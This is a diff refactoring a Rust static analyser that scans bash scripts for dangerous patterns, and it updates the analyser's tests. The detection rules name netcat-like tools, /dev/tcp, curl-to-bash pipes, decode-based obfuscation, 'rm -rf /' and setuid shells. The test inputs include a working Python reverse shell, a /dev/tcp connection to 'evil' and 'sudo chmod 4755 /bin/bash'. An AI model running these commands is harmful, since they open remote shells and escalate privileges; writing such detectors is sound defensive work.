@@ -11,16 +11,10 @@ static DANGEROUS_COMMAND_QUERY: Lazy<Query> =
     Lazy::new(|| Query::new(&BASH_LANGUAGE, DANGEROUS_COMMAND).expect("valid query"));
 
 #[derive(Debug, PartialEq, Eq)]
-pub struct BlockReason {
+pub struct StaticFinding {
     pub rule: &'static str,
     pub detail: String,
     pub severity: Severity,
-}
-
-#[derive(Debug, PartialEq, Eq)]
-pub enum Verdict {
-    Pass,
-    Flagged(BlockReason),
 }
 
 #[derive(Debug, Clone, Copy, PartialEq, Eq)]
@@ -29,7 +23,9 @@ pub enum Severity {
     Caution,
 }
 
-pub fn analyze(script: &str) -> Result<Verdict, BashtionError> {
+type RuleFn = fn(&str, Node) -> Result<Vec<StaticFinding>, BashtionError>;
+
+pub fn analyze(script: &str) -> Result<Vec<StaticFinding>, BashtionError> {
     let mut parser = Parser::new();
     parser
         .set_language(&BASH_LANGUAGE)
@@ -39,7 +35,7 @@ pub fn analyze(script: &str) -> Result<Verdict, BashtionError> {
         .parse(script, None)
         .ok_or_else(|| BashtionError::Other("Failed to parse script".into()))?;
 
-    let rules: &[fn(&str, Node) -> Result<Option<BlockReason>, BashtionError>] = &[
+    let rules: &[RuleFn] = &[
         rule_dangerous_commands,
         rule_dev_tcp,
         rule_pipeline_curl_shell,
@@ -47,16 +43,15 @@ pub fn analyze(script: &str) -> Result<Verdict, BashtionError> {
         rule_sudo_chmod_setuid_shell,
     ];
 
+    let mut findings = Vec::new();
     for rule in rules {
-        if let Some(reason) = rule(script, tree.root_node())? {
-            return Ok(Verdict::Flagged(reason));
-        }
+        findings.extend(rule(script, tree.root_node())?);
     }
 
-    Ok(Verdict::Pass)
+    Ok(findings)
 }
 
-fn rule_dangerous_commands(script: &str, root: Node) -> Result<Option<BlockReason>, BashtionError> {
+fn rule_dangerous_commands(script: &str, root: Node) -> Result<Vec<StaticFinding>, BashtionError> {
     let mut cursor = QueryCursor::new();
     let cmd_name_idx = DANGEROUS_COMMAND_QUERY
         .capture_index_for_name("cmd_name")
@@ -66,6 +61,7 @@ fn rule_dangerous_commands(script: &str, root: Node) -> Result<Option<BlockReaso
         .ok_or_else(|| BashtionError::Other("Query missing dangerous_command capture".into()))?;
 
     let mut matches = cursor.matches(&DANGEROUS_COMMAND_QUERY, root, script.as_bytes());
+    let mut findings = Vec::new();
     while let Some(m) = matches.next() {
         let mut command_node: Option<Node> = None;
         let mut name_text: Option<String> = None;
@@ -91,57 +87,62 @@ fn rule_dangerous_commands(script: &str, root: Node) -> Result<Option<BlockReaso
         let args = collect_arguments(command, script);
 
         if name == "eval" {
-            return Ok(Some(BlockReason {
+            findings.push(StaticFinding {
                 rule: "eval",
                 detail: "Dynamic execution via eval".to_string(),
                 severity: Severity::Block,
-            }));
+            });
+            continue;
         }
 
         if name == "base64" && has_flag_any(&args, &["-d", "--decode"]) {
-            return Ok(Some(BlockReason {
+            findings.push(StaticFinding {
                 rule: "base64_decode",
                 detail: "Obfuscation via base64 decode".to_string(),
                 severity: Severity::Block,
-            }));
+            });
+            continue;
         }
 
         if name == "openssl" {
             let has_enc = args.iter().any(|a| a == "enc");
             if has_enc && has_flag_any(&args, &["-d", "--decode"]) {
-                return Ok(Some(BlockReason {
+                findings.push(StaticFinding {
                     rule: "openssl_decode",
                     detail: "Obfuscation via openssl enc -d".to_string(),
                     severity: Severity::Block,
-                }));
+                });
+                continue;
             }
         }
 
         if matches!(name.as_str(), "nc" | "netcat" | "telnet") {
-            return Ok(Some(BlockReason {
+            findings.push(StaticFinding {
                 rule: "netcat_like",
-                detail: format!("Network backdoor tool detected: {}", name),
+                detail: format!("Network backdoor tool detected: {name}"),
                 severity: Severity::Block,
-            }));
+            });
+            continue;
         }
 
         if name == "rm" {
             let destructive_flag = args.iter().any(|a| a == "-rf" || a == "-fr");
             let targeting_root = args.iter().any(|a| a == "/");
             if destructive_flag && targeting_root {
-                return Ok(Some(BlockReason {
+                findings.push(StaticFinding {
                     rule: "rm_root",
                     detail: "Destructive command 'rm -rf /'".to_string(),
                     severity: Severity::Block,
-                }));
+                });
             }
         }
     }
 
-    Ok(None)
+    Ok(findings)
 }
 
-fn rule_dev_tcp(script: &str, root: Node) -> Result<Option<BlockReason>, BashtionError> {
+fn rule_dev_tcp(script: &str, root: Node) -> Result<Vec<StaticFinding>, BashtionError> {
+    let mut findings = Vec::new();
     let mut stack = vec![root];
     while let Some(node) = stack.pop() {
         let kind = node.kind();
@@ -149,12 +150,15 @@ fn rule_dev_tcp(script: &str, root: Node) -> Result<Option<BlockReason>, Bashtio
             continue;
         }
 
-        if kind == "word" && node_text(node, script).contains("/dev/tcp/") {
-            return Ok(Some(BlockReason {
-                rule: "dev_tcp",
-                detail: "Network backdoor via /dev/tcp detected".to_string(),
-                severity: Severity::Block,
-            }));
+        if kind == "word" {
+            let text = node_text(node, script);
+            if text.contains("/dev/tcp/") {
+                findings.push(StaticFinding {
+                    rule: "dev_tcp",
+                    detail: "Network backdoor via /dev/tcp detected".to_string(),
+                    severity: Severity::Block,
+                });
+            }
         }
 
         let mut cursor = node.walk();
@@ -163,13 +167,11 @@ fn rule_dev_tcp(script: &str, root: Node) -> Result<Option<BlockReason>, Bashtio
         }
     }
 
-    Ok(None)
+    Ok(findings)
 }
 
-fn rule_pipeline_curl_shell(
-    script: &str,
-    root: Node,
-) -> Result<Option<BlockReason>, BashtionError> {
+fn rule_pipeline_curl_shell(script: &str, root: Node) -> Result<Vec<StaticFinding>, BashtionError> {
+    let mut findings = Vec::new();
     let mut stack = vec![root];
     while let Some(node) = stack.pop() {
         let kind = node.kind();
@@ -178,11 +180,11 @@ fn rule_pipeline_curl_shell(
         }
 
         if kind == "pipeline" && pipeline_curl_to_shell(node, script) {
-            return Ok(Some(BlockReason {
+            findings.push(StaticFinding {
                 rule: "curl_pipeline",
                 detail: "curl|wget piped to bash/sh".to_string(),
                 severity: Severity::Caution,
-            }));
+            });
         }
 
         let mut cursor = node.walk();
@@ -191,13 +193,14 @@ fn rule_pipeline_curl_shell(
         }
     }
 
-    Ok(None)
+    Ok(findings)
 }
 
 fn rule_python_reverse_shell(
     script: &str,
     root: Node,
-) -> Result<Option<BlockReason>, BashtionError> {
+) -> Result<Vec<StaticFinding>, BashtionError> {
+    let mut findings = Vec::new();
     let mut stack = vec![root];
     while let Some(node) = stack.pop() {
         let kind = node.kind();
@@ -207,7 +210,7 @@ fn rule_python_reverse_shell(
 
         if kind == "command" {
             if let Some(reason) = command_python_reverse_shell(node, script) {
-                return Ok(Some(reason));
+                findings.push(reason);
             }
         }
 
@@ -216,13 +219,14 @@ fn rule_python_reverse_shell(
             stack.push(child);
         }
     }
-    Ok(None)
+    Ok(findings)
 }
 
 fn rule_sudo_chmod_setuid_shell(
     script: &str,
     root: Node,
-) -> Result<Option<BlockReason>, BashtionError> {
+) -> Result<Vec<StaticFinding>, BashtionError> {
+    let mut findings = Vec::new();
     let mut stack = vec![root];
     while let Some(node) = stack.pop() {
         let kind = node.kind();
@@ -232,7 +236,7 @@ fn rule_sudo_chmod_setuid_shell(
 
         if kind == "command" {
             if let Some(reason) = command_sudo_chmod(node, script) {
-                return Ok(Some(reason));
+                findings.push(reason);
             }
         }
 
@@ -241,7 +245,7 @@ fn rule_sudo_chmod_setuid_shell(
             stack.push(child);
         }
     }
-    Ok(None)
+    Ok(findings)
 }
 
 fn pipeline_curl_to_shell(node: Node, script: &str) -> bool {
@@ -259,14 +263,14 @@ fn pipeline_curl_to_shell(node: Node, script: &str) -> bool {
         && matches!(last.as_deref(), Some("bash") | Some("sh"))
 }
 
-fn command_python_reverse_shell(command: Node, script: &str) -> Option<BlockReason> {
+fn command_python_reverse_shell(command: Node, script: &str) -> Option<StaticFinding> {
     let name = get_command_name(&command, script)?;
     if !matches!(name.as_str(), "python" | "python3") {
         return None;
     }
     let args = collect_arguments(command, script);
     if is_python_reverse_shell(&args) {
-        return Some(BlockReason {
+        return Some(StaticFinding {
             rule: "python_reverse_shell",
             detail: "Python reverse shell detected".to_string(),
             severity: Severity::Block,
@@ -275,14 +279,14 @@ fn command_python_reverse_shell(command: Node, script: &str) -> Option<BlockReas
     None
 }
 
-fn command_sudo_chmod(command: Node, script: &str) -> Option<BlockReason> {
+fn command_sudo_chmod(command: Node, script: &str) -> Option<StaticFinding> {
     let name = get_command_name(&command, script)?;
     if name != "sudo" {
         return None;
     }
     let args = collect_arguments(command, script);
     if is_sudo_chmod_priv_escalation(&args) {
-        return Some(BlockReason {
+        return Some(StaticFinding {
             rule: "sudo_chmod_setuid",
             detail: "Priv-escalation via sudo chmod on shell".to_string(),
             severity: Severity::Block,
@@ -292,7 +296,6 @@ fn command_sudo_chmod(command: Node, script: &str) -> Option<BlockReason> {
 }
 
 fn is_python_reverse_shell(args: &[String]) -> bool {
-    // Look for -c payloads containing socket connect and subprocess/dup2 patterns
     let mut iter = args.iter().peekable();
     while let Some(arg) = iter.next() {
         if arg == "-c" {
@@ -325,7 +328,7 @@ fn is_sudo_chmod_priv_escalation(args: &[String]) -> bool {
     }
     let mode = &args[1];
     let target = &args[2];
-    let suspicious_mode = mode.starts_with('4') && mode.len() == 4; // setuid/setgid bits
+    let suspicious_mode = mode.starts_with('4') && mode.len() == 4;
     let target_shell = target.contains("/bin/bash") || target.contains("/bin/sh");
     suspicious_mode && target_shell
 }
@@ -366,78 +369,63 @@ mod tests {
     use super::*;
 
     #[test]
-    fn flag_detection() {
+    fn flag_detection_helper() {
         assert!(has_flag_any(&vec!["-d".into()], &["-d", "--decode"]));
         assert!(has_flag_any(&vec!["--decode".into()], &["-d", "--decode"]));
         assert!(!has_flag_any(&vec!["-x".into()], &["-d", "--decode"]));
     }
 
-    #[test]
-    fn static_blocks_eval() {
-        let verdict = analyze("eval ls").unwrap();
-        assert!(matches!(verdict, Verdict::Flagged(_)));
+    fn run_static(script: &str) -> Vec<StaticFinding> {
+        analyze(script).unwrap()
     }
 
     #[test]
-    fn static_blocks_base64_decode() {
-        let verdict = analyze("base64 -d something").unwrap();
-        assert!(matches!(verdict, Verdict::Flagged(_)));
+    fn static_flags_eval() {
+        let results = run_static("eval ls");
+        assert!(results.iter().any(|f| f.rule == "eval"));
+    }
+
+    #[test]
+    fn static_flags_base64_decode() {
+        let results = run_static("base64 -d something");
+        assert!(results.iter().any(|f| f.rule == "base64_decode"));
     }
 
     #[test]
     fn static_allows_base64_encode() {
-        let verdict = analyze("echo test | base64").unwrap();
-        assert!(matches!(verdict, Verdict::Pass));
+        let results = run_static("echo test | base64");
+        assert!(results.is_empty());
     }
 
     #[test]
-    fn static_blocks_rm_root() {
-        let verdict = analyze("rm -rf /").unwrap();
-        assert!(matches!(verdict, Verdict::Flagged(_)));
+    fn static_flags_rm_root() {
+        let results = run_static("rm -rf /");
+        assert!(results.iter().any(|f| f.rule == "rm_root"));
     }
 
     #[test]
-    fn static_blocks_dev_tcp() {
-        let verdict = analyze("cat </dev/tcp/1.2.3.4/4444").unwrap();
-        assert!(matches!(verdict, Verdict::Flagged(_)));
+    fn static_flags_dev_tcp() {
+        let results = run_static("exec 5<>/dev/tcp/evil/1337");
+        assert!(results.iter().any(|f| f.rule == "dev_tcp"));
     }
 
     #[test]
-    fn static_allows_simple_echo() {
-        let verdict = analyze("echo safe").unwrap();
-        assert!(
-            matches!(verdict, Verdict::Pass),
-            "simple echo should be allowed"
-        );
+    fn static_flags_pipeline_curl_shell() {
+        let results = run_static("curl http://x | bash");
+        assert!(results.iter().any(|f| f.rule == "curl_pipeline"));
     }
 
     #[test]
-    fn blocks_curl_to_bash_pipeline() {
-        let script = "curl https://example.com/install.sh | bash";
-        let verdict = analyze(script).unwrap();
-        assert!(
-            matches!(verdict, Verdict::Flagged(_)),
-            "curl|bash should be blocked"
-        );
+    fn static_flags_python_reverse_shell() {
+        let script = r#"python -c "import socket,os,subprocess;s=socket.socket();s.connect(('1.2.3.4',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);subprocess.call(['sh','-i'])""#;
+        let results = run_static(script);
+        assert!(results.iter().any(|f| f.rule == "python_reverse_shell"));
     }
 
     #[test]
-    fn blocks_python_reverse_shell_pattern() {
-        let script = "python -c \"import socket,subprocess,os;s=socket.socket();s.connect(('1.2.3.4',4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(['bash','-i'])\"";
-        let verdict = analyze(script).unwrap();
-        assert!(
-            matches!(verdict, Verdict::Flagged(_)),
-            "python reverse shell should be blocked"
-        );
-    }
-
-    #[test]
-    fn blocks_sudo_chmod_setuid_shell() {
-        let script = "sudo chmod 4777 /bin/bash";
-        let verdict = analyze(script).unwrap();
-        assert!(
-            matches!(verdict, Verdict::Flagged(_)),
-            "sudo chmod on shell should be blocked"
-        );
+    fn static_flags_sudo_chmod_setuid() {
+        let script = "sudo chmod 4755 /bin/bash";
+        let results = run_static(script);
+        assert!(results.iter().any(|f| f.rule == "sudo_chmod_setuid"));
     }
 }
